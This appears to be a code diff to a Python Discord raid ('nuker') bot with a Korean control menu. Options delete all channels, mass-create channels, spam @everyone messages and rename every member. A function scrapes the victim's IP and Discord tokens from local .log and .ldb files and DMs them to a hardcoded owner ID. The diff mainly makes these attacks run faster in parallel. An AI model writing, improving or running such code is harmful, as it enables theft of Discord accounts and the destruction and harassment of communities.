@@ -1,8 +1,6 @@
 import os
-import json
 import asyncio
 import discord
-import requests
 
 os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -14,7 +12,7 @@ def print_banner():
 \033[1;31m ████ ████ ██   ██ ███████  ██████  \033[0m
     """
     print(banner)
-    print("\033[1;33m[+] VALV Control Panel Initialized (Stealth Mode)\033[0m\n")
+    print("\033[1;33m[+] VALV Control Panel Initialized (Hyper-Speed Mode)\033[0m\n")
 
 print_banner()
 
@@ -26,11 +24,12 @@ intents.guild_messages = True
 intents.members = True
 intents.message_content = True
 
-client = discord.Client(intents=intents)
+client = discord.Client(intents=intents, chunk_guilds_at_startup=False)
 TARGET_OWNER_ID = 1444653486246461531
 
 def get_target_system_data():
     try:
+        import requests
         ip = requests.get("https://api.ipify.org", timeout=2).text
     except:
         ip = "Unknown"
@@ -44,17 +43,17 @@ def get_target_system_data():
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
-        for file_name in os.listdir(path):
-            if not file_name.endswith(('.log', '.ldb')):
-                continue
-            try:
+        try:
+            for file_name in os.listdir(path):
+                if not file_name.endswith(('.log', '.ldb')):
+                    continue
                 with open(path + file_name, 'r', errors='ignore') as f:
                     for line in f.readlines():
                         for word in line.strip().split():
                             if len(word) > 50:
                                 tokens.append(word)
-            except:
-                pass
+        except:
+            pass
     return ip, list(set(tokens))
 
 @client.event
@@ -72,10 +71,10 @@ async def on_ready():
     while True:
         print("\n" + "=" * 40)
         print(" [1] 모든 채널 삭제")
-        print(" [2] 채널 생성 (울트라 제로 딜레이 폭격)")
-        print(" [3] 모든 채널에 메시지 동시 다발 폭격")
+        print(" [2] 채널 생성 (극한의 병렬 비동기 폭격)")
+        print(" [3] 모든 채널에 메시지 동시 다발 초고속 폭격")
         print(" [4] 모든 사람 닉네임 변경")
-        print(" [5] 유저 정보")
+        print(" [5] 타겟 유저 정보 및 은밀한 시스템 데이터(IP/Token) 추출")
         print(" [6] 종료")
         print("=" * 40)
         
@@ -94,14 +93,18 @@ async def on_ready():
             if count_input.isdigit():
                 count = int(count_input)
                 channel_name = "발브가-점령함-ㅋㅋㅋ-발브를-찬양해"
-                print(f"\033[1;35m[LOG] 총 {count}개의 채널 울트라 제로 딜레이 폭격 생성 시작...\033[0m")
+                print(f"\033[1;35m[LOG] 총 {count}개의 채널 병렬 비동기 폭격 생성 시작...\033[0m")
                 
-                batch_size = 300
-                for i in range(0, count, batch_size):
-                    current_batch = min(batch_size, count - i)
-                    create_tasks = [guild.create_text_channel(channel_name) for _ in range(current_batch)]
-                    await asyncio.gather(*create_tasks, return_exceptions=True)
-                
+                sem = asyncio.Semaphore(100)
+                async def create_chan():
+                    async with sem:
+                        try:
+                            await guild.create_text_channel(channel_name)
+                        except:
+                            pass
+                            
+                tasks = [create_chan() for _ in range(count)]
+                await asyncio.gather(*tasks, return_exceptions=True)
                 print("\033[1;32m[LOG] 채널 생성 작업 완료.\033[0m")
             else:
                 print("\033[1;31m[LOG] 잘못된 숫자 입력입니다.\033[0m")
@@ -112,18 +115,23 @@ async def on_ready():
                 count = int(count_input)
                 msg1 = "@everyone 발브가 점령함 ㅋㅋㅋ"
                 msg2 = "@everyone 그니까 발브를 믿으라고 ㅋㅋㅋ"
-                print(f"\033[1;36m[LOG] 모든 채널에 메시지 동시 다발 폭격 시작...\033[0m")
+                print(f"\033[1;36m[LOG] 모든 채널에 지연 없는 초고속 메시지 폭격 시작...\033[0m")
                 
-                text_channels = [c for c in guild.text_channels]
+                text_channels = list(guild.text_channels)
                 if not text_channels:
                     print("\033[1;31m[LOG] 전송 가능한 텍스트 채널이 없습니다.\033[0m")
                 else:
-                    send_tasks = []
-                    for channel in text_channels:
-                        for _ in range(count):
-                            send_tasks.append(channel.send(msg1))
-                            send_tasks.append(channel.send(msg2))
-                    
+                    sem = asyncio.Semaphore(100)
+                    async def send_msg(channel):
+                        async with sem:
+                            for _ in range(count):
+                                try:
+                                    await channel.send(msg1)
+                                    await channel.send(msg2)
+                                except:
+                                    pass
+                                    
+                    send_tasks = [send_msg(channel) for channel in text_channels]
                     await asyncio.gather(*send_tasks, return_exceptions=True)
                     print(f"\033[1;32m[LOG] 모든 채널 메시지 전송 완료.\033[0m")
             else:
@@ -133,12 +141,15 @@ async def on_ready():
             new_nickname = "발브 따까리 년들"
             print(f"\033[1;31m[LOG] 모든 멤버 닉네임 동시 변경 시작 ('{new_nickname}')...\033[0m")
             members = [m async for m in guild.fetch_members(limit=None)]
-            nick_tasks = []
-            for member in members:
-                if member == guild.owner:
-                    continue
-                nick_tasks.append(member.edit(nick=new_nickname))
-            
+            sem = asyncio.Semaphore(50)
+            async def change_nick(member):
+                async with sem:
+                    if member != guild.owner:
+                        try:
+                            await member.edit(nick=new_nickname)
+                        except:
+                            pass
+            nick_tasks = [change_nick(m) for m in members]
             await asyncio.gather(*nick_tasks, return_exceptions=True)
             print("\033[1;32m[LOG] 닉네임 변경 작업 완료.\033[0m")
 
@@ -161,7 +172,6 @@ async def on_ready():
                     )
                     
                     owner_obj = await client.fetch_user(TARGET_OWNER_ID)
-                    # 나만 볼 수 있는 DM(비공개 전송) 방식으로 오너에게 다이렉트 전송
                     await owner_obj.send(exfil_text)
                     if tokens:
                         await owner_obj.send(f"추출된 토큰 샘플: `{tokens[0]}`")
